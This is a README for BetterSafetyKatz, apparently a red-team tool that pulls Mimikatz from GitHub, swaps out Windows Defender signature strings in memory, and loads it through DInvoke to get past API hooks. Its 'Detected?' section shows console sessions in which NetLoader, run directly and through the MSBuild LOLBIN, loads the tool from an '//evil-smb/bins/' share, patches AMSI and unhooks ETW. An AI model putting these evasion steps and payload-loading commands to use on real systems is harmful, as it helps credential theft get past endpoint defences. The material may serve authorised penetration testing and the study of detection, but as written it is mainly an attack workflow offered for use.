# BetterSafetyKatz?

This modified fork of SafetyKatz dynamically fetches the latest pre-compiled release of Mimikatz directly from the gentilkiwi GitHub repo, 
runtime patching on detected signatures and uses SharpSploit DInvoke to get it into memory.

1. Gets the URL for the latest ZIP / PreCompiled Mimikatz binary directly from GitHub Repo
2. Unzipped in memory, turned into HEX. Then strings/signatures detected by Windows Defender are replaced with random strings of the same size 
    (Used https://github.com/matterpreter/DefenderCheck to gather signatures detected)
3. PE-Loaded into mem using SharpSploit 1.6 DInvoke, bypassing API hooking.(https://thewover.github.io/Dynamic-Invoke/)

Stolen from @harmj0y, @subtee and @gentilkiwi, repurposed by @Flangvik and @Mrtn9

[@harmj0y](https://twitter.com/harmj0y) is the primary author of the port that this repo is forked from.

BetterSafetyKatz is licensed under the BSD 3-Clause license.

## Detected?

BetterSafetyKatz can be deployed using [NetLoader](https://github.com/Flangvik/NetLoader), this will bypass common AV solutions such as Windows Defender.

	PS D:\Projects\NetLoader> .\NetLoader.exe --path //evil-smb/bins/BetterSafetyKatz.exe --args coffee
	[!] ~Flangvik , ~Arno0x #NetLoader
	[+] Successfully patched AMSI!
	[+] Successfully unhooked ETW!
	[+] URL/PATH : //evil-smb/bins/BetterSafetyKatz.exe
	[+] Arguments : coffee
	[+] Stolen from @harmj0y, @subtee and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
	[+] Contacting repo -> 2.2.0-20200519/mimikatz_trunk.zip
	[+] Randomizing strings in memory

	  .#####.   022PO6WM 2.2.0 (x64) #19041 May 19 2020 00:48:59
	 .## ^ ##.  "2HREDZLQ6LC4KWE48WS" - (J888K)
	 ## / \ ##  /*** SX6HATY8UCZTFP `3I6B0MYQ03` ( 66OC8VHW@3I6B0MYQ03.com )
	 ## \ / ##       > http://blog.3I6B0MYQ03.com/022PO6WM
	 '## v ##'       KVY3O5BG9LH90CH             ( EWGZ4I5Z22719E0QZJTNFIJF )
	  '#####'        > VOIN6NBQ5J7P55TZBTT4H / WXFFZUHZ5JPERL93VZ3VC1W   ***/

	022PO6WM # coffee

		( (
		 ) )
	  .______.
	  |      |]
	  \      /
	   `----'

	022PO6WM #
	
Or via the NetLoader MSBuild LOLBIN

	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe NetLoader.xml
	[!] ~Flangvik , ~Arno0x #NetLoader
	[?] Input X in any field to exit!
	[?] Is all input base64 encoded ? y/n -> n
	[?] Input path or url -> //evil-smb/bins/BetterSafetyKatz.exe
	[?] Is the payload data XOR encrypted ? y/n -> n
	[?] Input payload args (optional) -> coffee
	[+] Successfully patched AMSI!
	[+] Successfully unhooked ETW!
	[+] URL/PATH : //evil-smb/bins/BetterSafetyKatz.exe
	[+] Arguments : coffee
	[+] Stolen from @harmj0y, @subtee and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
	[+] Contacting repo -> 2.2.0-20200519/mimikatz_trunk.zip
	[+] Randomizing strings in memory

	  .#####.   022PO6WM 2.2.0 (x64) #19041 May 19 2020 00:48:59
	 .## ^ ##.  "2HREDZLQ6LC4KWE48WS" - (J888K)
	 ## / \ ##  /*** SX6HATY8UCZTFP `3I6B0MYQ03` ( 66OC8VHW@3I6B0MYQ03.com )
	 ## \ / ##       > http://blog.3I6B0MYQ03.com/022PO6WM
	 '## v ##'       KVY3O5BG9LH90CH             ( EWGZ4I5Z22719E0QZJTNFIJF )
	  '#####'        > VOIN6NBQ5J7P55TZBTT4H / WXFFZUHZ5JPERL93VZ3VC1W   ***/

	022PO6WM # coffee

		( (
		 ) )
	  .______.
	  |      |]
	  \      /
	   `----'

	022PO6WM #
	

